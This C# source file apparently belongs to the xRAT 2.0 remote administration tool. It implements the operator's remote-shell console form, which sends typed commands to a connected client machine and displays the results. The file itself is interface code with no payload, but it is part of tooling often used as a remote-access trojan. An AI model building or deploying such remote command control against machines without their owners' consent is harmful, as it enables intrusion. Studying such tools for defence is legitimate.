using System;
using System.Windows.Forms;
using xServer.Core;
using System.Drawing;
using System.Linq;

namespace xServer.Forms
{
    public interface IRemoteShell
    {
        void PrintMessage(string message);
        void PrintError(string errorMessage);
    }

    public partial class FrmRemoteShell : Form, IRemoteShell
    {
        private readonly Client _connectClient;

        public FrmRemoteShell(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmRs = this;

            InitializeComponent();

            this.DoubleBuffered = true;

            txtConsoleOutput.AppendText(">> Type 'exit' to close this session" + Environment.NewLine);
        }

        public void PrintMessage(string message)
        {
            this.txtConsoleOutput.AppendText(message);
        }

        public void PrintError(string errorMessage)
        {
            Color OriginalColor = txtConsoleOutput.ForeColor;

            txtConsoleOutput.SelectionColor = Color.Red;
            txtConsoleOutput.AppendText(errorMessage);

            txtConsoleOutput.ForeColor = OriginalColor;
        }

        private void FrmRemoteShell_Load(object sender, EventArgs e)
        {
            if (_connectClient != null)
                this.Text = string.Format("xRAT 2.0 - Remote Shell [{0}:{1}]",
                    _connectClient.EndPoint.Address.ToString(), _connectClient.EndPoint.Port.ToString());
        }

        private void FrmRemoteShell_FormClosing(object sender, FormClosingEventArgs e)
        {
            new Core.Packets.ServerPackets.ShellCommand("exit").Execute(_connectClient);
            if (_connectClient.Value != null)
                _connectClient.Value.FrmRs = null;
        }

        private void txtConsoleOutput_TextChanged(object sender, EventArgs e)
        {
            txtConsoleOutput.SelectionStart = txtConsoleOutput.TextLength;
            txtConsoleOutput.ScrollToCaret();
        }

        private void txtConsoleInput_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter && !string.IsNullOrEmpty(txtConsoleInput.Text.Trim()))
            {
                string input = txtConsoleInput.Text;
                txtConsoleInput.Text = string.Empty;

                // We have an exit command.
                if (input == "exit" || input.Trim() == "exit" ||
                    //    Space character                       null-character
                    input.Split(' ').Contains("exit") || input.Split(' ').Contains("exit"))
                {
                    new Core.Packets.ServerPackets.ShellCommand("exit").Execute(_connectClient);
                    this.Close();
                }
                else
                {
                    switch (input)
                    {
                        case "cls":
                            txtConsoleOutput.Text = string.Empty;
                            break;
                        default:
                            new Core.Packets.ServerPackets.ShellCommand(input).Execute(_connectClient);
                            break;
                    }
                }

                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }

        private void txtConsoleOutput_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar != (char) 2)
            {
                txtConsoleInput.Text += e.KeyChar.ToString();
                txtConsoleInput.Focus();
                txtConsoleInput.SelectionStart = txtConsoleOutput.TextLength;
                txtConsoleInput.ScrollToCaret();
            }
        }
    }
}